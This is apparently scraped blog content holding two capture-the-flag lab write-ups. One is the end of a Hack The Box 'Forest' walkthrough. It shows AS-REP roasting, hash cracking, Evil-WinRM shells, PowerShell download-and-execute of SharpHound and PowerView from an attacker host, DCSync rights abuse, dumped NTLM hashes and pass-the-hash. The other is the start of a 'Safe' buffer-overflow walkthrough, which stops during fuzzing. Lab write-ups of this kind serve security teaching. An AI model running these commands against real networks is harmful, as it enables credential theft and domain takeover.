tcp filtered unknown no-response 16999 / tcp filtered unknown no-response 19145 / tcp filtered unknown no-response 26874 / tcp filtered unknown no-response 40188 / tcp filtered unknown no-response [ 0 / 9248 ] 46294 / tcp filtered unknown no-response 46996 / tcp filtered unknown no-response 47001 / tcp open http syn-ack Microsoft HTTPAPI httpd 2 . 0 ( SSDP / UPnP ) | _http-server-header : Microsoft-HTTPAPI / 2 . 0 | _http-title : Not Found 49664 / tcp open msrpc syn-ack Microsoft Windows RPC 49665 / tcp open msrpc syn-ack Microsoft Windows RPC 49666 / tcp open msrpc syn-ack Microsoft Windows RPC 49667 / tcp open msrpc syn-ack Microsoft Windows RPC 49671 / tcp open msrpc syn-ack Microsoft Windows RPC 49676 / tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 . 0 49677 / tcp open msrpc syn-ack Microsoft Windows RPC 49684 / tcp open msrpc syn-ack Microsoft Windows RPC 49703 / tcp open msrpc syn-ack Microsoft Windows RPC 49927 / tcp open msrpc syn-ack Microsoft Windows RPC 56278 / tcp filtered unknown no-response 62108 / tcp filtered unknown no-response 64026 / tcp filtered unknown no-response 1 service unrecognized despite returning data . If you know the service / version , please submit the following fingerprint at https :// nmap . org / cgi-bin / submit . cgi ? new-service : SF-Port53-TCP : V = 7 . 80 % I = 9 % D = 9 / 26 % Time = 5F6F10E4 % P = x86_64-pc-linux-gnu % r ( DNSV SF : ersionBindReqTCP , 20 , \"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\" ); Service Info : Host : FOREST ; OS : Windows ; CPE : cpe :/ o : microsoft : windows Host script results : | _clock-skew : mean : 2h31m05s , deviation : 4h02m31s , median : 11m03s | p2p-conficker : | Checking for Conficker . C or higher ... | Check 1 ( port 39687 / tcp ): CLEAN ( Couldn 't connect) | Check 2 (port 32753/tcp): CLEAN (Couldn' t connect ) | Check 3 ( port 59790 / udp ): CLEAN ( Timeout ) | Check 4 ( port 44587 / udp ): CLEAN ( Failed to receive data ) | _ 0 / 4 checks are positive : Host is CLEAN or ports are blocked | smb-os-discovery : | OS : Windows Server 2016 Standard 14393 ( Windows Server 2016 Standard 6 . 3 ) | Computer name : FOREST | NetBIOS computer name : FOREST \\ x00 | Domain name : htb . local | Forest name : htb . local | FQDN : FOREST . htb . local | _ System time : 2020-09-26T03 : 17 : 57-07 : 00 | smb-security-mode : | account_used : guest | authentication_level : user | challenge_response : supported | _ message_signing : required | smb2-security-mode : | 2 . 02 : | _ Message signing enabled and required | smb2-time : | date : 2020-09-26T10 : 17 : 58 | _ start_date : 2020-09-26T05 : 15 : 01 Read data files from : / usr / bin /../ share / nmap Service detection performed . Please report any incorrect results at https :// nmap . org / submit / . # Nmap done at Sat Sep 26 11 : 09 : 04 2020 -- 1 IP address ( 1 host up ) scanned in 17583 . 00 seconds From the above report we can deduct we are dealing with a typical Active Directory domain controller environment, since we have all the ports a typical domain uses. We also get the Windows version, that is: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) enum4linux found the following domain users for us (through rpc anonymous authentication): user : [ Administrator ] rid : [ 0x1f4 ] user : [ Guest ] rid : [ 0x1f5 ] user : [ krbtgt ] rid : [ 0x1f6 ] user : [ DefaultAccount ] rid : [ 0x1f7 ] user : [ $331000-VK4ADACQNUCA ] rid : [ 0x463 ] user : [ SM_2c8eef0a09b545acb ] rid : [ 0x464 ] user : [ SM_ca8c2ed5bdab4dc9b ] rid : [ 0x465 ] user : [ SM_75a538d3025e4db9a ] rid : [ 0x466 ] user : [ SM_681f53d4942840e18 ] rid : [ 0x467 ] user : [ SM_1b41c9286325456bb ] rid : [ 0x468 ] user : [ SM_9b69f1b9d2cc45549 ] rid : [ 0x469 ] user : [ SM_7c96b981967141ebb ] rid : [ 0x46a ] user : [ SM_c75ee099d0a64c91b ] rid : [ 0x46b ] user : [ SM_1ffab36a2f5f479cb ] rid : [ 0x46c ] user : [ HealthMailboxc3d7722 ] rid : [ 0x46e ] user : [ HealthMailboxfc9daad ] rid : [ 0x46f ] user : [ HealthMailboxc0a90c9 ] rid : [ 0x470 ] user : [ HealthMailbox670628e ] rid : [ 0x471 ] user : [ HealthMailbox968e74d ] rid : [ 0x472 ] user : [ HealthMailbox6ded678 ] rid : [ 0x473 ] user : [ HealthMailbox83d6781 ] rid : [ 0x474 ] user : [ HealthMailboxfd87238 ] rid : [ 0x475 ] user : [ HealthMailboxb01ac64 ] rid : [ 0x476 ] user : [ HealthMailbox7108a4e ] rid : [ 0x477 ] user : [ HealthMailbox0659cc1 ] rid : [ 0x478 ] user : [ sebastien ] rid : [ 0x479 ] user : [ lucinda ] rid : [ 0x47a ] user : [ svc-alfresco ] rid : [ 0x47b ] user : [ andy ] rid : [ 0x47e ] user : [ mark ] rid : [ 0x47f ] user : [ santi ] rid : [ 0x480 ] Other useful information was found with enum4linux such as domain groups, users group memberships, and so on. From the above list of users I extract the ones with common names, the ones that do not seem either default accounts or service related accounts, and put them on a file called users.txt: kali@kali:~/Documents/HTB/boxes/results/10.10.10.161/scans$ cat ../loot/users.txt Administrator andy lucinda mark santi sebastien svc-alfresco Initial Foothold (AS-REP Roasting) Having a list of users is always good but without credentials we are kind of limited on what we can do. We cannot, for instance, perform a Kerberoasting attack as I did on Active . We can, however, attempt the AS-REP Roasting attack. For the technical details, a good article on the topic can be found here but there are many other online. In short, if any of the accounts in the list we have acquired have the option \"Do not require Kerberos preauthentication\" set in Active Directory then we will be able to get the hash of its password. Below a screenshot of the \"Do not require Kerberos preauthentication\" options taken from one of Domain Controllers test boxes: To attempt the attack I will use GetNPUsers.py from the Impacket suite as follows: GetNPUsers.py HTB/ -usersfile ../loot/users.txt -no-pass -dc-ip 10.10.10.161 where HTB/ is the domain (we obtained this info through nmap and anum4linux) -usersfile ../loot/users.txt indicates the file with the list of users -no-pass to use no passwords -dc-ip 10.10.10.161 indicates the IP of the Domain Controller This is the result: kali @kali : ~/ Documents / HTB / boxes / results / 10.10.10.161 / scans $ GetNPUsers . py HTB / - usersfile .. / loot / users . txt - no - pass - dc - ip 10.10.10.161 Impacket v0 .9.21 - Copyright 2020 SecureAuth Corporation [ - ] User Administrator doesn 't have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn' t have UF_DONT_REQUIRE_PREAUTH set [ - ] User lucinda doesn 't have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn' t have UF_DONT_REQUIRE_PREAUTH set [ - ] User santi doesn 't have UF_DONT_REQUIRE_PREAUTH set [-] User sebastien doesn' t have UF_DONT_REQUIRE_PREAUTH set $ krb5asrep $ 23 $ svc - alfresco @HTB : f7939b9120ec2a115fca89696d98cf1c $ af9a4d6a30557ad75f2ce14db8f9c07c73a91a353bac0baddf7a9418560bbdeeef4c1177daace3351e71fe4929bba0a182756b370c2d5317e6f24460efea7026ab455ef9858ec1cc030ce7c4130a6cd9a0d7609f7a67f83093830bfff973685535ea65f6ca7dad17b477f12bfce0b7130022d0c9ab9cb4d024ac3716b3da2945f03dd2545cd8a4c240265f1ee465a6b1683a039dc61e4c0194d7d943f08bf3f45b1cc8c318584d4ddc6c2c1dfd6e2d83b33d0cb9002a6b585f5fa9a7f0d4c1309583e0cd8082ba25484c910e66c3fd62194a24102a3888afe62208c707f7d266 We can see that we managed to get the hash for the user svc-alfresco . Let's now try to crack that hash using hashcat . For that we need to know the hashcat hash mode number. hashcat help page contains a list of the hash modes and knowing this is an as-rep hash I can grep the help page to obtain the mode: kali@kali:~/Documents/HTB/boxes/results/10.10.10.161/scans$ hashcat --help |grep -i as-rep 18200 | Kerberos 5, etype 23, AS-REP Our number is 18200. We can now attempt to crack the hash: kali @kali : ~/ Documents / HTB / boxes / results / 10.10.10.161 / loot $ hashcat - m 18200 svc - alfresco . hash / usr / share / wordlists / rockyou . txt --force hashcat ( v6 .1.1 ) starting ... < SNIP > $ krb5asrep $ 23 $ svc - alfresco @HTB : f7939b9120ec2a115fca89696d98cf1c $ af9a4d6a30557ad75f2ce14db8f9c07c73a91a353bac0baddf7a9418560bbdeeef4c1177daace3351e71fe4929bba0a182756b370c2d5317e6f24460efea7026ab455ef9858ec 1 cc030ce7c4130a6cd9a0d7609f7a67f83093830bfff973685535ea65f6ca7dad17b477f12bfce0b7130022d0c9ab9cb4d024ac3716b3da2945f03dd2545cd8a4c240265f1ee465a6b1683a039dc61e4c0194d7d943f08bf3f45b1cc8c318584d4ddc6c2c1dfd 6e2 d83b33d0cb9002a6b585f5fa9a7f0d4c1309583e0cd8082ba25484c910e66c3fd62194a24102a3888afe62208c707f7d266 : s3rvice Session .......... : hashcat Status ........... : Cracked Hash . Name ........ : Kerberos 5 , etype 23 , AS - REP Hash . Target ...... : $ krb5asrep $ 23 $ svc - alfresco @HTB : f7939b9120ec2a115fca ... f7d266 Time . Started ..... : Sat Sep 26 09 : 46 : 45 2020 , ( 4 secs ) Time . Estimated ... : Sat Sep 26 09 : 46 : 49 2020 , ( 0 secs ) Guess . Base ....... : File ( / usr / share / wordlists / rockyou . txt ) Guess . Queue ...... : 1 / 1 ( 100.00 % ) Speed . #1 ......... : 1229.0 kH / s ( 6.83 ms ) @ Accel : 64 Loops : 1 Thr : 64 Vec : 8 Recovered ........ : 1 / 1 ( 100.00 % ) Digests Progress ......... : 4096000 / 14344385 ( 28.55 % ) Rejected ......... : 0 / 4096000 ( 0.00 % ) Restore . Point .... : 4079616 / 14344385 ( 28.44 % ) Restore . Sub . #1 ... : Salt : 0 Amplifier : 0 - 1 Iteration : 0 - 1 Candidates . #1 .... : s9039554h -> s / nd / 0 s Started : Sat Sep 26 09 : 46 : 30 2020 Stopped : Sat Sep 26 09 : 46 : 51 2020 In few seconds the hash was cracked, the password is s3rvice . At this point I had valid credentials for a user and the full nmap scan showed port 5985 is open so we can try to get a shell using Evil-WinRM . kali @kali : ~ $ evil - winrm - i 10.10.10.161 - u svc - alfresco - p 's3rvice' Evil - WinRM shell v2 .3 Info : Establishing connection to remote endpoint * Evil - WinRM * PS C : \\ Users \\ svc - alfresco \\ Documents > whoami htb \\ svc - alfresco * Evil - WinRM * PS C : \\ Users \\ svc - alfresco \\ Documents > cd .. / Desktop * Evil - WinRM * PS C : \\ Users \\ svc - alfresco \\ Desktop > type user . txt e5 **************************** ed Privilege Escalation Given we are dealing with an Active Directory environment we could leverage Bloodhound to ease the indentification of potential attack paths. The tool is a Javascript web application which provides a graphical interpretation of the privilege relationships of an Active Directory environment. The tool also provides detailed descriptions of the relationships and the potential attack paths. From the Evil-WinRM shell previously obtained I first run SharpHound.ps1 which will load the compiled C# ingestor into memory: *Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/SharpHound.ps1') I then invoke BloodHound as follows: *Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop> Invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice and after some time I can see a zip file has been generated: * Evil - WinRM * PS C : \\ Users \\ svc - alfresco \\ desktop > dir Directory : C : \\ Users \\ svc - alfresco \\ desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- - a ---- 9/26/2020 8:17 AM 15278 20200926081701_BloodHound.zip - ar --- 9/23/2019 2:16 PM 32 user.txt To transfer the zip to my Kali box I start an SMB server on my Kali box and activate a share: kali @kali : ~/ Documents / HTB / boxes / results / 10.10.10.161 / loot $ sudo smbserver . py share . - username m4rc0ff - password test123 [ sudo ] password for kali : Impacket v0 .9.21 - Copyright 2020 SecureAuth Corporation [ * ] Config file parsed [ * ] Callback added for UUID 4 B324FC8 - 1670 - 01 D3 - 1278 - 5 A47BF6EE188 V : 3.0 [ * ] Callback added for UUID 6 BFFD098 - A112 - 3610 - 9833 - 46 C3F87E345A V : 1.0 [ * ] Config file parsed [ * ] Config file parsed [ * ] Config file parsed Then I connect to the share from the Windows target box and copy the zip file over: * Evil - WinRM * PS C : \\ Users \\ svc - alfresco \\ desktop > net use \\\\ 10 . 10 . 14 . 4 \\ myshare / u : m4rc0ff test123 The command completed successfully . * Evil - WinRM * PS C : \\ Users \\ svc - alfresco \\ desktop > copy 20200926081701 _BloodHound . zip \\\\ 10 . 10 . 14 . 4 \\ myshare Once this is done, I open BloodHound interface on my Kali box and I upload the zip file. From the Queries menu on the top left I select Find Shortest Paths to Domain Admins option. After some clean up I have this nice graph showing the privilege relationships: As shown in the graph above, generated with Bloodhound, the user svc-alfresco is member of the Service Accounts group which in turn is member of the Privileged IT Accounts group which in turn is member of the Account Operators group. This can also be confirmed with the following command: * Evil - WinRM * PS C : \\ Users \\ svc - alfresco \\ Documents > whoami / groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============================================= ================================================== Everyone Well - known group S - 1 - 1 - 0 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Users Alias S - 1 - 5 - 32 - 545 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Pre - Windows 2000 Compatible Access Alias S - 1 - 5 - 32 - 554 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Remote Management Users Alias S - 1 - 5 - 32 - 580 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Account Operators Alias S - 1 - 5 - 32 - 548 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ NETWORK Well - known group S - 1 - 5 - 2 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ Authenticated Users Well - known group S - 1 - 5 - 11 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ This Organization Well - known group S - 1 - 5 - 15 Mandatory group , Enabled by default , Enabled group HTB \\ Privileged IT Accounts Group S - 1 - 5 - 21 - 3072663084 - 364016917 - 1341370565 - 1149 Mandatory group , Enabled by default , Enabled group HTB \\ Service Accounts Group S - 1 - 5 - 21 - 3072663084 - 364016917 - 1341370565 - 1148 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ NTLM Authentication Well - known group S - 1 - 5 - 64 - 10 Mandatory group , Enabled by default , Enabled group Mandatory Label \\ Medium Mandatory Level Label S - 1 - 16 - 8192 The Account Operators group presents GenericAll privileges over the Exchange Windows Permissions group. By clicking on the edge between the two groups we can see these details: The above screenshots provide a detailed description as well as specific instructions of how to execute the attack. Continuing with this pace we see that the group Exchange Windows Permissions has WriteDacl rights over the HTB.LOCAL domain. Here the details: What does this all mean for us? Let's put things in practice: We can create a user on the domain because svc-alfresco is a member of the group Account Operators : *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> net user marco password /add /domain The command completed successfully. We can add that user to the Exchange Windows Permission group since svc-alfresco has GenericAll privileges on it. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> net group \"Exchange Windows Permissions\" /add marco The command completed successfully. Since the Exchange Windows Permission group has WriteDacl rights over the domain, we can give that user DCSync rights so that he would be able to perform domain replication and therefore dump all the password hashes from the domain. To do that we need to first import PowerView . *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> IEX (new-object net.webclient).downloadstring('http:/*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> IEX (new-object net.webclient).downloadstring('http://10.10.14.5/PowerView.ps1') kali@kali:~/Tools/PowerSploit/Recon$ sudo python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.161 - - [28/Sep/2020 10:36:18] \"GET /PowerView.ps1 HTTP/1.1\" 200 - *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb\\marco', $SecPassword) *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity marco -Rights DCSync Now that the user has been added to the Exchange Windows Permission group and has been given DCSync rights we can dump the hashes using secretdump.py from Kali: kali @ kali : ~/ Documents / HTB / boxes / results / 10.10.10.161 $ secretsdump . py - just - dc htb / marco : password @10.10.10.161 Impacket v0 .9.21 - Copyright 2020 SecureAuth Corporation [ * ] Dumping Domain Credentials ( domain \\ uid : rid : lmhash : nthash ) [ * ] Using the DRSUAPI method to get NTDS . DIT secrets htb . local \\ Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 32693 b11e6aa90eb43d32c72a07ceea6 ::: Guest : 501 : aad3b435b51404eeaad3b435b51404ee : 31 d6cfe0d16ae931b73c59d7e0c089c0 ::: krbtgt : 502 : aad3b435b51404eeaad3b435b51404ee : 819 af826bb148e603acb0f33d17632f8 ::: DefaultAccount : 503 : aad3b435b51404eeaad3b435b51404ee : 31 d6cfe0d16ae931b73c59d7e0c089c0 ::: htb . local \\$ 331000 - VK4ADACQNUCA : 1123 : aad3b435b51404eeaad3b435b51404ee : 31 d6cfe0d16ae931b73c59d7e0c089c0 ::: htb . local \\ SM_2c8eef0a09b545acb : 1124 : aad3b435b51404eeaad3b435b51404ee : 31 d6cfe0d16ae931b73c59d7e0c089c0 ::: htb . local \\ SM_ca8c2ed5bdab4dc9b : 1125 : aad3b435b51404eeaad3b435b51404ee : 31 d6cfe0d16ae931b73c59d7e0c089c0 ::: htb . local \\ SM_75a538d3025e4db9a : 1126 : aad3b435b51404eeaad3b435b51404ee : 31 d6cfe0d16ae931b73c59d7e0c089c0 ::: < SNIP > With the Administrator user hash at our disposal we can pwerform a pass-the-hash attack using psexec.py and get a shell: kali @ kali : ~/ Documents / HTB / boxes / results / 10.10.10.161 $ psexec . py - hashes aad3b435b51404eeaad3b435b51404ee : 32693 b11e6aa90eb43d32c72a07ceea6 administrator @10.10.10.161 Impacket v0 .9.21 - Copyright 2020 SecureAuth Corporation [ * ] Requesting shares on 10.10.10.161 ..... [ * ] Found writable share ADMIN $ [ * ] Uploading file EqFArccL . exe [ * ] Opening SVCManager on 10.10.10.161 ..... [ * ] Creating service WVXx on 10.10.10.161 ..... [ * ] Starting service WVXx ..... [ ! ] Press help for extra shell commands Microsoft Windows [ Version 10.0.14393 ] ( c ) 2016 Microsoft Corporation . All rights reserved . C : \\ Windows \\ system32 > type c : \\ users \\ administrator \\ desktop \\ root . txt f0 **************************** cc","tags":"blogging","loc":"https://sittingducks.io/Forest.html","title":"Forest"},{"url":"https://sittingducks.io/Safe.html","text":"Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10 .10.10.147 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-25 09:27 BST Nmap scan report for 10.10.10.147 Host is up (0.086s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA) | 256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA) |_ 256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.25 seconds I run gobuster on the web server and I didn't get anything useful: m4rc0ff@SittingDucks:~$ gobuster dir -u http://10.10.10.147 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -t 30 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.147 [+] Threads: 30 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] Timeout: 10s =============================================================== 2020/06/25 09:34:43 Starting gobuster =============================================================== /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403) =============================================================== 2020/06/25 10:22:06 Finished =============================================================== I decided to do a full port scan with masscan and I got one more port, that is 1337: m4rc0ff@SittingDucks:~$ sudo masscan -p1-65535 10 .10.10.147 -e tun0 --rate = 1000 [sudo] password for m4rc0ff: Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-25 09:24:05 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 22/tcp on 10.10.10.147 Discovered open port 1337/tcp on 10.10.10.147 Discovered open port 80/tcp on 10.10.10.147 Then I do service enumeration on that port with nmap but the result shows a service could not be detected: m4rc0ff@SittingDucks:~$ nmap -sV -sC -p1337 10 .10.10.147 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-25 10:27 BST Nmap scan report for 10.10.10.147 Host is up (0.083s latency). PORT STATE SERVICE VERSION 1337/tcp open waste? | fingerprint-strings: | DNSStatusRequestTCP: | 05:24:06 up 1:01, 0 users, load average: 0.00, 0.07, 0.12 | DNSVersionBindReqTCP: | 05:24:01 up 1:01, 0 users, load average: 0.00, 0.07, 0.12 | GenericLines: | 05:23:49 up 1:01, 0 users, load average: 0.00, 0.07, 0.13 | What do you want me to echo back? | GetRequest: | 05:23:55 up 1:01, 0 users, load average: 0.00, 0.07, 0.13 | What do you want me to echo back? GET / HTTP/1.0 | HTTPOptions: | 05:23:55 up 1:01, 0 users, load average: 0.00, 0.07, 0.13 | What do you want me to echo back? OPTIONS / HTTP/1.0 | Help: | 05:24:11 up 1:01, 0 users, load average: 0.00, 0.07, 0.12 | What do you want me to echo back? HELP | NULL: | 05:23:49 up 1:01, 0 users, load average: 0.00, 0.07, 0.13 | RPCCheck: | 05:23:55 up 1:01, 0 users, load average: 0.00, 0.07, 0.13 | RTSPRequest: | 05:23:55 up 1:01, 0 users, load average: 0.00, 0.07, 0.13 | What do you want me to echo back? OPTIONS / RTSP/1.0 | SSLSessionReq, TLSSessionReq, TerminalServerCookie: | 05:24:11 up 1:01, 0 users, load average: 0.00, 0.07, 0.12 |_ What do you want me to echo back? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.80%I=7%D=6/25%Time=5EF46DF1%P=x86_64-pc-linux-gnu% r ( NU SF:LL,3E,\"\\x2005:23:49\\x20up\\x20\\x201:01,\\x20\\x200\\x20users,\\x20\\x20load\\x SF:20average:\\x200\\.00,\\x200\\.07,\\x200\\.13\\n\")% r ( GenericLines,63, \"\\x2005:2 SF:3:49\\x20up\\x20\\x201:01,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200 SF:\\.00,\\x200\\.07,\\x200\\.13\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20ec SF:ho\\x20back\\?\\x20\\r\\n\")% r ( GetRequest,71, \"\\x2005:23:55\\x20up\\x20\\x201:01, SF:\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\.07,\\x200\\.1 SF:3\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20GET\\x20 SF:/\\x20HTTP/1\\.0\\r\\n\")% r ( HTTPOptions,75, \"\\x2005:23:55\\x20up\\x20\\x201:01,\\ SF:x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\.07,\\x200\\.13 SF:\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIONS\\ SF:x20/\\x20HTTP/1\\.0\\r\\n\")% r ( RTSPRequest,75, \"\\x2005:23:55\\x20up\\x20\\x201:0 SF:1,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\.07,\\x200\\ SF:.13\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIO SF:NS\\x20/\\x20RTSP/1\\.0\\r\\n\")% r ( RPCCheck,3E, \"\\x2005:23:55\\x20up\\x20\\x201:0 SF:1,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\.07,\\x200\\ SF:.13\\n\")% r ( DNSVersionBindReqTCP,3E, \"\\x2005:24:01\\x20up\\x20\\x201:01,\\x20\\ SF:x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\.07,\\x200\\.12\\n\" ) SF:%r(DNSStatusRequestTCP,3E,\"\\x2005:24:06\\x20up\\x20\\x201:01,\\x20\\x200\\x20 SF:users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\.07,\\x200\\.12\\n\")% r ( Help, SF:67,\"\\x2005:24:11\\x20up\\x20\\x201:01,\\x20\\x200\\x20users,\\x20\\x20load\\x20a SF:verage:\\x200\\.00,\\x200\\.07,\\x200\\.12\\n\\nWhat\\x20do\\x20you\\x20want\\x20me SF:\\x20to\\x20echo\\x20back\\?\\x20HELP\\r\\n\")% r ( SSLSessionReq,64, \"\\x2005:24:11 SF:\\x20up\\x20\\x201:01,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00 SF:,\\x200\\.07,\\x200\\.12\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x SF:20back\\?\\x20\\x16\\x03\\n\")% r ( TerminalServerCookie,63, \"\\x2005:24:11\\x20up\\ SF:x20\\x201:01,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\ SF:.07,\\x200\\.12\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\ SF:?\\x20\\x03\\n\" ) %r ( TLSSessionReq,64, \"\\x2005:24:11\\x20up\\x20\\x201:01,\\x20\\x SF:200\\x20users,\\x20\\x20load\\x20average:\\x200\\.00,\\x200\\.07,\\x200\\.12\\n\\nW SF:hat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20\\x16\\x03\\n\"); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 91.77 seconds The main webpage shows the default apache page: and the source code of that page shows a comment: As per the comment, I navigate to http://10.10.10.147/myapp and I download the application. Having a look at it with file I can see this: m4rc0ff@SittingDucks:~/Documents/htbBoxes/safe$ file myapp myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped We are dealing with an ELF 64-bit executable file so I open that file with Ghidra , a software reverse engineering (SRE) suite of tools developed by NSA's Research Directorate. Once in Ghidra, I check the decompiler and see the below regarding the main function: decompile: main - (myapp) undefined8 main ( void ) { char local_78 [ 112 ]; system ( \"/usr/bin/uptime\" ); printf ( \" \\n What do you want me to echo back? \" ); gets ( local_78 ); puts ( local_78 ); return 0 ; } The application above does the following steps: takes an input of 112 byte and assigns it to a variable named local_78 runs uptime which indicates the time the system has been running for prints \"What do you want me to echo back?\" reads what's in local_78 using gets() writes what's in local_78 to stdout using puts() The important thing to notice here is that the gets() function does not check the maximum limit of the input and most probably we will have a buffer overflow. Let's try to prove that with some fuzzing running the application with gdb (and its gef plugin ) : m4rc0ff@SittingDucks:~/Documents/htbBoxes/safe$ gdb ./myapp GNU gdb (Debian 9.2-1) 9.2 Copyright (C) 2020 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: <http://www.gnu.org/software/gdb/bugs/>. Find the GDB manual and other documentation resources online at: <http://www.gnu.org/software/gdb/documentation/>. For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... GEF for linux ready, type `gef' to start, `gef config' to configure 80 commands loaded for GDB 9.2 using Python engine 3.8 Reading symbols from ./myapp... (No debugging symbols found in ./myapp) gef➤ run Starting program: /home/m4rc0ff/Documents/htbBoxes/safe/myapp [Detaching after vfork from child process 99945] 20:20:07 up 1 day, 23:25, 4 users, load average: 0.05, 0.07, 0.03 What do you want me to echo back? Hiya SittingDucks Hiya SittingDucks [Inferior 1 (process 99941) exited normally] As shown above, once we run the application it asks the question \"What do you want me to echo back?\" which I answered \"Hiya SittingDucks\". The application simply echo's back \"Hiya SittingDucks\" and exits normally. Since we know the application takes 112 bytes as input, let's now generate a pattern of 112 characters and then add 8 more bytes, specifically I am adding 8 X's. If the calculation is correct we should see the application crashing and the 8 additional bytes falling in the next register. gef➤ pattern create 112 [+] Generating a pattern of 112 bytes aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaa [+] Saved as '$_gef3' gef➤ run Starting program: /home/m4rc0ff/Documents/htbBoxes/safe/myapp [Detaching after vfork from child process 3103] 07:21:40 up 1:31, 4 users, load average: 0.00, 0.00, 0.00 What do you want me to echo back? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaXXXXXXXX 